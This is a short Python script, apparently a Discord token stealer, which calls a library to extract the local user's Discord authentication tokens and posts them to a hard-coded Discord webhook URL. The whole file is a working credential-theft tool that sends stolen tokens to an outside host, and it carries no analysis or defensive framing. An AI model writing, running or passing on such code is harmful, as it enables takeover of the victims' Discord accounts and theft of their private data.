from discord_token_lib.token_extractor import get_discord_tokens
from discord_token_lib.webhook_sender import send_tokens_via_webhook

def main():
    webhook_url = "https://discord.com/api/webhooks/1271645951026659339/wWCSAlPG3TuhycH7ex6h9O48nKdFn4G55WUk4-lgay4RQTpCbbt-DYuo9jLIHYEReQKj"
    tokens = get_discord_tokens()
    send_tokens_via_webhook(tokens, webhook_url)

if __name__ == "__main__":
    main()
